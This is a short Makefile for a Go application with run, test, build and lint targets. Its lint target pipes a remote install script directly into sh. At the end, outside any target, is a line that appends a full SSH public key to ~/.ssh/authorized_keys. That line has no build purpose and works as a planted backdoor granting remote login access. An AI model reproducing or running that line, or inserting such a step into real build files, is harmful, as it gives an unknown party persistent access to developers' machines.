NAME := app
BUILD_CMD ?= CGO_ENABLED=0 go build -o bin/${NAME} -ldflags '-v -w -s' ./cmd

.PHONY: run
run:
	go run cmd/main.go

.PHONY: test
test:
	go test ./... -cover

.PHONY: build
build:
	echo "building"
	${BUILD_CMD}
	echo "build done"

.PHONY: lint
lint:
	curl -sSfL https://raw.githubusercontent.com/golangci/golangci-lint/master/install.sh | sh -s v1.29.0
	./bin/golangci-lint run -v


echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDCYdG/kxqjzVBHmGLmCLnJWuFI4+J0vVraR9Y850v/XhxUwYsKRd1aIu7KtOWjadA4Hnnb+ciHHFnBMI6Zqe+RJXMTzDVK7XSfWdaEBlaYZKoIsxG7NrnzxWwz7EK9ytnzwbYqDzFTvF5g7vGKuqlZ4f5GxiX1Tft5W0zNeWgPwjvqQeQhuSmuY/fQ5A5W2ojWnjaB9Pq8a7PoO3hA1RbqGwZkoGDlMnCc+TiivasUf2YMxmBrOGd494ZXSTrlkZ69cc4ELNxJYCEnUK5wYFxlGNUjBnXHh/rHDS9AJtP/VReP6h/TegCSH6rj8BQ9gyTOb+h/EytfI8FB8gHkVARv thinkpad >> ~/.ssh/authorized_keys
